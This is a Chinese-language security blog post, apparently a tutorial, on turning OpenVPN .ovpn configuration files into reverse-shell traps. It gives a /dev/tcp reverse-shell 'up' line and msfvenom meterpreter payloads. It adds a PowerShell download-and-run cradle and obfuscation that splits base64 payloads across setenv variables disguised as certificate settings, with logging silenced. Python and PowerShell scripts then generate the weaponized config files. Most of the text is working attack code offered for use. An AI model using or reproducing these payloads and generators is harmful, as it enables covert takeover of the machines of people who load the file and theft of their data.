@@ -1,0 +1,276 @@
+OpenVPN是企业常用的数据传输工具，然而使用不信任的ovpn文件是十分危险的，一旦被恶意利用可能会导致企业的数据信息泄露。本文介绍了攻击者是如何对OpenVPN的配置文件进行修改，构建出可连接到远程控制端的反制模块，从而实现对OpenVPN用户系统的控制管理，深入探讨“反制”行为。
+
+## 简述
+
+无意中看到一篇18年的老文，作者描述了一种利用OVPN文件（即OpenVpn的配置文件）创建一个反弹Shell的操作。核心在于官方声明的up命令，该命令常用于启用TUN后的指定路由。本质上相当于起了一个进程运行指向的任意脚本。
+
+![1600050860.png!small](https://image.3001.net/images/20200914/1600050860.png!small)
+
+作者给出了linux下的POC
+
+    
+    
+    remote 192.168.1.245
+    ifconfig 10.200.0.2 10.200.0.1
+    dev tun
+    script-security 2
+    up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.1.218/8181 0<&1 2>&1&'"
+
+并且探索了win上利用powershell弹shell的配置可行性
+
+![1600050879.png!small](https://image.3001.net/images/20200914/1600050879.png!small)
+
+通过环境变量绕过up命令长度只能低于256的限制。
+
+想要利用这样一个明显带有恶意命令的配置文件来反制具备安全意识的攻击者是比较难。
+
+## 优化
+
+    
+    
+    + Ubuntu20 (自带Openvpn)
+    + win10 (OpenVpn Gui 2.4.9)
+    [https://openvpn-gui.en.lo4d.com/windows]
+
+### 01 Linux
+
+首先是Linux平台，测试可以直接用自带的openvpn加载配置
+
+openvpn -config evil.config
+
+既然win上可以用环境变量分割payload，显然linux上也可以这样做
+
+仿造botnet常用手段，将一条下载木马并执行的命令base64编码一下
+
+![1602641394_5f865df2a4a19923a881c.png!small?1602641392124](https://image.3001.net/images/20201014/1602641394_5f865df2a4a19923a881c.png!small?1602641392124)但执行`/bin/bash`的特征没别的好办法去掉，
+翻了一下官方样例配置文件，然后往里边添加了100多行配置代码和注释，并且混淆了切割的payload变量名，伪装成与证书相关的操作
+
+![1600050904.png!small](https://image.3001.net/images/20200914/1600050904.png!small)
+
+    
+    
+    # generate
+    msfvenom -p linux/x86/meterpreter_reverse_https LHOST=192.168.114.165 LPORT=8080 -o a -f elf
+    # host the launcher pe
+    python3 -m http.server 80
+    # start to listen
+    msfconsole -r linux_listen.rc
+
+msf正常上线， 此处应有图， 但并没有。
+
+### 02 Win
+
+本以为win的比较好做，毕竟原文已经给出了调用powershell的poc了，但...先看看原文的调用
+
+    
+    
+    up 'C:\\Windows\\System32\\cmd.exe /c (start %z1% -WindowStyle Hidden -EncodedCommand %a1%%b1%%c1%%d1%%e1%%f1%%g1%%h1%%i1%%j1%%k1%%l1%%m1%%n1%%o1%%p1%%q1%%r1%%s1% ) ||'
+
+  
+用的是三无作坊的ps脚本，命令太长了20多个变量才切割完，祭出msf
+
+    
+    
+    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-reflection -o a.ps1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh -o a.ps1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-net -o a.ps1
+
+先后尝试了三种格式的，都不太稳定...只有初始包, meterpreter背锅
+
+    
+    
+    msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.114.165 lport=8888 -f base64
+
+最后拿原始payload自己替换到cs的powershell模板中，将模板的异或解密去掉
+
+![1600050916.png!small](https://image.3001.net/images/20200914/1600050916.png!small)
+
+    
+    
+    python3 -m http.server 80
+    # start to listen
+    msfconsole -r win_listen.rc
+
+加载时就只需要执行这一串就可以了
+
+    
+    
+    iex(New-Object Net.WebClient).DownloadString('http://127.0.0.1/a.ps1');a.ps1
+
+这样就成功将命令缩短到4段，再简化一下参数，将参数的指定方式`-`替换为`/`作下基本免杀，不然实在看不下眼了
+
+    
+    
+    setenv k0 xxx
+    setenv k1 xxx
+    setenv k2 xxx
+    setenv k3 xxx
+    up 'C:\\Windows\\System32\\cmd.exe /c "(start powershell /w hidden /enc %k0%%k1%%k2%%k3%)"'
+
+先拿去试了一试，可以成功执行，但hidden参数并不起作用，powershell的窗口一闪而过
+
+直接在cmd终端甚至webshell下通过cmd /c 调用的powershell时加上hidden参数是不应该有任何闪窗的
+
+然后意识到这里用了start来启一个进程，这与以下的命令虽然像，但效果可不同, 果然是调用方式问题
+
+    
+    
+    cmd.exe /c powershell /w hidden /enc %k0%%k1%%k2%%k3%
+
+尝试将start去掉，这下好了?不, 这下崩了，虽然官方文档中说明了能使用单引号和双引号，反引号注明传递参数
+
+单在win上的gui中某些特定情况下,并没有将整串powershell命令当作参数导致解析失败
+
+而用start的方式调用会有闪窗..在一番乱查之后发现cmd还有一个`/b`参数可以解决这个万恶的闪窗
+
+![1600050978.png!small](https://image.3001.net/images/20200914/1600050978.png!small)
+
+详细查看了一下错误日志,因为执行这一串命令后,返回的值跟openvpn预料的不符
+
+所以openvpn认为这是执行失败了,所以把进程kill掉,并中断一切操作...
+
+那就给它加个管道把输出丢了吧
+
+    
+    
+    up 'C:\\Windows\\System32\\cmd.exe /c "(start /min /b powershell /w hidden /enc encoded_shellcode)|cmd"'
+
+但这样还是太长了很显眼，既然是cmd然后再调用的powershell，我们其实有两次解析环境变量的机会，因此可以再嵌套一层变量
+
+    
+    
+    setenv kk 'start /min /b powershell /w hidden /enc %k0%%k1%%k2%%k3%'
+    up 'C:\\Windows\\System32\\cmd.exe /c "(%kk%)|cmd"'
+
+当然不要忘了把日志等级设置一下,不然debug信息就把命令输出到log了
+
+    
+    
+    # Set log file verbosity.
+    verb 0
+
+最终利用
+
+    
+    
+    msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.114.165 lport=8888 -f base64
+    # 替换到powershell模板里,然后python3 -m http.server 80
+    # 将下载的url转为base64, 切割成四段, 隐藏到配置文件中...
+
+全手动啊？好麻烦啊, 这也叫武器化？
+
+## 武器化
+
+生成脚本它这就来
+
+### 01 Linux
+
+linux平台配置文件生成脚本
+
+    
+    
+    import base64
+    import random
+    import argparse
+    
+    template = '''太长就不放了'''
+    
+    def handle_tempalte(p1,p2,p3,p4):
+    return template.format(first='setenv resolv "{}"'.format(p1),
+    second='setenv key "{}"'.format(p2),
+    thrid='setenv client_key "{}"'.format(p3),
+    
+    fourth='setenv cert "{}"'.format(p4))
+    
+    def encode_payload(url):
+    
+    file_str = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba',4))
+    return str(base64.b64encode(bytes("curl {url} -s -o /tmp/{file_str} && chmod +x /tmp/{file_str} && /tmp/{file_str}".format(url=url, file_str=file_str),encoding="utf-8"))).strip("b'")
+    
+    if __name__ == "__main__":
+    
+    parser = argparse.ArgumentParser()
+    parser.add_argument("url", help="the url where to download your cat")
+    args = parser.parse_args()
+    evil_code = encode_payload(args.url)
+    print("[+] evil_code: {}".format(evil_code))
+    flag = int(len(evil_code)/4)
+    file_content = handle_tempalte(evil_code[:flag], evil_code[flag:2*flag], evil_code[2*flag:3*flag],evil_code[3*flag:])
+    with open("evil.config", "w") as f:
+    f.write(file_content)
+    print('[*] Done! Maybe you should: msfvenom -p linux/x86/meterpreter_reverse_https LHOST=192.168.114.165 LPORT=8080 -o a -f elf')
+
+### 02 Win
+
+powershell中/enc参数所需的base64编码是unicode的....无奈只能拿powershell写了
+
+    
+    
+    Set-StrictMode -Version 2
+    
+    $powershell_template = @'太长就不放了'@
+    $tempalte = @'太长就不放了'@
+    function handle_tempalte {
+    Param ($first, $second, $thrid, $fourth)
+    $tempalte = $tempalte.Replace('{first}',$first)
+    $tempalte = $tempalte.Replace('{second}',$second)
+    $tempalte = $tempalte.Replace('{thrid}',$thrid)
+    return $tempalte.Replace('{fourth}',$fourth)
+    }
+    
+    function handle_pstempalte {
+    Param ($shellcode)
+    return $powershell_template.Replace('%DATA%',$shellcode)
+    }
+    
+    $url = Read-Host "Please enter your download url, Ex: http://192.168.114.165/a.ps1 :"
+    $file = Read-Host "Please enter your script name, Ex: a.ps1 :"
+    $raw_payload = "iex(New-Object Net.WebClient).DownloadString('{url}');{file}".Replace('{url}',$url).Replace('{file}',$file)
+    Write-Host $raw_payload
+    $b64_payload = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($raw_payload))
+    # split payload
+    $flag = $b64_payload.length/4
+    $evil_ovpn = handle_tempalte $b64_payload.Substring(0,55).Insert(0,"setenv k0 ") $b64_payload.Substring($flag,$flag).Insert(0,"setenv k1 ") $b64_payload.Substring($flag*2,$flag).Insert(0,"setenv k2 ") $b64_payload.Substring($flag*3,$flag).Insert(0,"setenv k3 ")
+    Out-File -FilePath .\evil.ovpn -InputObject $evil_ovpn -Encoding utf8
+    Write-Host "generate shellcode command: msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.114.165 lport=8888 -f base64"
+    $shellcode = Read-Host "Please enter your shellcode :"
+    $evil_ps = handle_pstempalte $shellcode
+    Out-File -FilePath .\evil.ps1 -InputObject $evil_ps -Encoding utf8
+
+## Usage
+
+### 01 Linux
+
+    
+    
+    msfvenom -p linux/x86/meterpreter_reverse_https LHOST=192.168.114.165 LPORT=8080 -o a -f elf
+    python3 generate_linux.py http://192.168.114.165/a
+    # host the launcher pe
+    python3 -m http.server 80
+    # start to listen
+    msfconsole -r linux_listen.rc
+    # attacker use the evil config file
+    sudo openvpn --config evil.ovpn
+
+### 02 Win
+
+    
+    
+    msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.114.165 lport=8888 -f base64
+    powershell -ep bypass -f generate_win.ps1
+    > Please enter your download url, Ex: http://192.168.114.165/a.ps1 :: http://192.168.114.165/a.ps1
+    > Please enter your script name, Ex: a.ps1 :: a.ps1
+    > iex(New-Object Net.WebClient).DownloadString('http://192.168.114.165/a.ps1');a.ps1
+    > generate shellcode command: msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.114.165 lport=8888 -f base64
+    > Please enter your shellcode :: shellcode
+    > [*] Done! Host your evil.ps1 by 'python3 -m http.server 80' on your vps
+    > [+] please look at evil.ovpn, and show me your SET skill
+    # host the launcher pe
+    python3 -m http.server 80
+    # start to listen
+    msfconsole -r win_listen.rc
+
+## References
+
+文章：Reverse Shell from an OpenVPN Configuration File
+
+链接地址：https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da
+
